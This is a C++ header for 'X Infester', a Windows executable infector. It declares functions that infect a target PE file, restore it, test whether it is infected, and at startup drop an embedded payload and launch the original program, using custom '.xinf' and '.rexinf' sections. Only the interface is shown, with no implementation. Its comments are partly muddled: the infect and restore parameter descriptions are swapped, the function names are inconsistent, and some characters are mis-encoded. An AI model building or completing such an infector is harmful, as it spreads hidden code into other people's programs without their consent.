//////////////////////////////////////////////
//X Infester for windows platform
//language:C++
//Module Codes by DBinary
//2015-10-10 
//////////////////////////////////////////////
#pragma once

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../../PEStructure/PEStructure.h"

#define XINFESTED_SOURCE_SECTION_STRING		".xinf"
#define XINFESTED_RESOURCE_SECTION_STRING	".rexinf"

//************************************
// Method:    XInfester_Run
// FullName:  XInfester_Run
// Access:    public 
// Returns:   void
// Qualifier:
// The function should be call in program begin
// it  will free resource file to current path(if the file has been infested.) & CreateProcess for source file
// MakeSure the execution file without parameters 
//************************************
void XInfester_Run();



//************************************
// Method:    XInfester_InfestFile
// FullName:  XInfester_InfestFile
// Access:    public 
// Returns:   BOOL (if succeed return TRUE£¬if failed else FALSE)
// Qualifier:
// Parameter: const char * pDestFileName : The file will be restore
//************************************
BOOL XInfester_InfectFile(const char *pDestFileName);


//************************************
// Method:    XInfester_RestoreFile
// FullName:  XInfester_RestoreFile
// Access:    public 
// Returns:   BOOL (if succeed return TRUE£¬if failed else FALSE)
// Qualifier:
// Parameter: const char * pDestFileName : The file will be infest
// Restore file if infested.
//************************************
BOOL XInfester_RestoreFile(const char *pDestFileName);
//************************************
// Method:    XInfester_IsFileInfected
// FullName:  XInfester_IsFileInfected
// Access:    public 
// Returns:   BOOL (if infected return TRUE,else FALSE)
// Qualifier:
// Parameter: const char * pDestFileName : The file will be test
// Determine whether the file is infected
//************************************
BOOL XInfester_IsFileInfected(const char *pDestFileName);